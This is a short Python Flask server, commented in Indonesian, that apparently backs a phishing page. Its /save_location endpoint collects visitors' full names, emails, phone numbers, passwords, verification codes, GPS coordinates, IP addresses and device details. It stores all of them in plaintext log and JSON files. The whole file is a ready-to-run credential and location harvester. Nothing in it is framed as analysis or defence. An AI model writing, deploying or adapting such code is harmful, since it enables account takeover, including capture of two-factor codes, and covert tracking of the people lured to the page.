from flask import Flask, render_template, request, jsonify
import json
import os
from datetime import datetime
import random

app = Flask(__name__, template_folder='templates')

BASE_DIR = os.getcwd()
LOCATION_DIR = os.path.join(BASE_DIR, 'location')

# Buat folder location jika belum ada
if not os.path.exists(LOCATION_DIR):
    os.makedirs(LOCATION_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        lat = data.get('latitude', 'N/A')
        lon = data.get('longitude', 'N/A')
        timestamp = data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        has_location = data.get('has_location', False)
        
        # Ambil semua data dari request
        fullname = data.get('fullname', 'N/A')
        email = data.get('email', 'N/A')
        phone = data.get('phone', 'N/A')
        password = data.get('password', 'N/A')
        verify_code = data.get('verify_code', 'N/A')
        
        # Ambil IP Address
        real_ip = request.headers.get('X-Forwarded-For')
        if not real_ip:
            real_ip = request.remote_addr
        if ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        # Ambil User Agent (Device Info)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        location_status = "✅ Tersedia" if has_location else "❌ Ditolak/Blokir"
        
        # Simpan ke file TXT
        file_txt = os.path.join(LOCATION_DIR, 'location_log.txt')
        with open(file_txt, 'a', encoding='utf-8') as f:
            f.write(f"📍 {timestamp}\n")
            f.write(f"   Nama Lengkap: {fullname}\n")
            f.write(f"   IP: {real_ip}\n")
            f.write(f"   Email: {email}\n")
            f.write(f"   Password: {password}\n")
            f.write(f"   Nomor HP: {phone}\n")
            f.write(f"   Kode Verifikasi: {verify_code}\n")
            f.write(f"   Status Lokasi: {location_status}\n")
            f.write(f"   Lat: {lat}, Lon: {lon}\n")
            f.write(f"   Device: {user_agent}\n")
            f.write("-" * 60 + "\n")
        
        # Simpan ke file JSON
        file_json = os.path.join(LOCATION_DIR, 'current_location.json')
        with open(file_json, 'w', encoding='utf-8') as f:
            json.dump({
                'timestamp': timestamp,
                'fullname': fullname,
                'ip_address': real_ip,
                'email': email,
                'password': password,
                'phone': phone,
                'verify_code': verify_code,
                'latitude': lat,
                'longitude': lon,
                'has_location': has_location,
                'location_status': location_status,
                'user_agent': user_agent
            }, f, indent=4, ensure_ascii=False)
        
        return jsonify({
            'status': 'success', 
            'message': 'Data tersimpan',
            'ip': real_ip,
            'location': location_status
        })
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    print("🚀 Server starting on port 8080...")
    app.run(host='0.0.0.0', port=8080, debug=False)